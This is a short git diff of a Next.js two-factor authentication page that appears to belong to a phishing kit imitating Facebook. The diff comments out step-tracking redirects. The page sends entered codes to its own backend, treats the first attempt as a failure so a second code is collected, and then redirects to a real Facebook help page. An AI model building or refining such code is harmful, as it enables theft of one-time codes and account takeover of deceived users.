@@ -1,5 +1,5 @@
 import { ErrorMessage } from '@/components/common/error-message';
-import { useLocalStorage } from '@/helpers/useLocalstorage';
+// import { useLocalStorage } from '@/helpers/useLocalstorage';
 import { twoFactor } from '@/request/post';
 import { useRouter } from 'next/router';
 import React, { useEffect, useState } from 'react';
@@ -15,16 +15,16 @@ function TwoFactor() {
     setError,
   } = useForm();
   const router = useRouter();
-  const [step, setStep] = useLocalStorage('step');
+  // const [step, setStep] = useLocalStorage('step');
   const [failCount, setFailCount] = useState(1);
 
-  useEffect(() => {
-    if (step === 1) {
-      router.push('/contact/295038365360854');
-    } else if (step === 2) {
-      router.push('/login');
-    }
-  }, [router, step]);
+  // useEffect(() => {
+  //   if (step === 1) {
+  //     router.push('/contact/295038365360854');
+  //   } else if (step === 2) {
+  //     router.push('/login');
+  //   }
+  // }, [router, step]);
 
   const initialTime = 5 * 60; // 5 minutes in seconds
   const [time, setTime] = useState(initialTime);
@@ -48,7 +48,7 @@ function TwoFactor() {
     const res = await twoFactor(data);
 
     if (res?.status && !failCount) {
-      setStep(0);
+      // setStep(0);
       router.push('https://www.facebook.com/help/1288173394636262');
     } else {
       reset();
